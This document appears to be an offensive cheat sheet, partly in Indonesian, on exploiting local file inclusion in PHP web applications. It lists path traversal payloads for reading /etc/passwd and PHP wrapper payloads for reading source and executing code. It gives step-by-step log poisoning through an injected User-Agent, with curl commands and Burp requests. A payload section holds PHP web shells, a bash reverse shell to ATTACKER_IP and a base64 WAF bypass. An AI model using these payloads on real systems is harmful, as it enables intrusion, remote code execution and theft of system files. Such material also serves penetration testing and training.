# LFI (Local File Inclusion)

## Path Traversal
```text
?page=../../../../etc/passwd
?page=../../../../etc/passwd%00          # null byte (PHP lama)
?page=....//....//....//etc/passwd       # bypass filter ../
```

## PHP Wrappers
```text
?page=php://filter/convert.base64-encode/resource=index.php    # baca source
?page=data://text/plain,<?php system($_GET['cmd']);?>          # RCE
?page=expect://id
```

## Log Poisoning (LFI -> RCE)

### Lokasi Log Files
```text
# Apache
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log

# Nginx
/var/log/nginx/access.log
/var/log/nginx/error.log

# FTP
/var/log/vsftpd.log
```

### Apache/Nginx Access Log Poisoning
```bash
# Step 1: Inject PHP ke User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include log file via LFI + eksekusi command
http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=id
http://target.com/vuln.php?page=/var/log/nginx/access.log&cmd=whoami
```

**Burp Suite Request (Inject User-Agent):**
```http
GET / HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml
Connection: close
```

**Burp Suite Request (Trigger RCE via LFI):**
```http
GET /vuln.php?page=/var/log/apache2/access.log&cmd=id HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Connection: close
```

### Useful Payloads
```php
# Simple command execution
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>

# Reverse shell payload
<?php system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'); ?>

# Encoded payload (bypass WAF)
<?php system(base64_decode('aWQ=')); ?>   # 'id' in base64
```

### Tips
- Jika log file terlalu besar, server mungkin timeout - coba error.log (biasanya lebih kecil)
- Cek permission file log (www-data harus bisa read)
- Gunakan Burp untuk inject payload agar tidak ter-encode oleh terminal
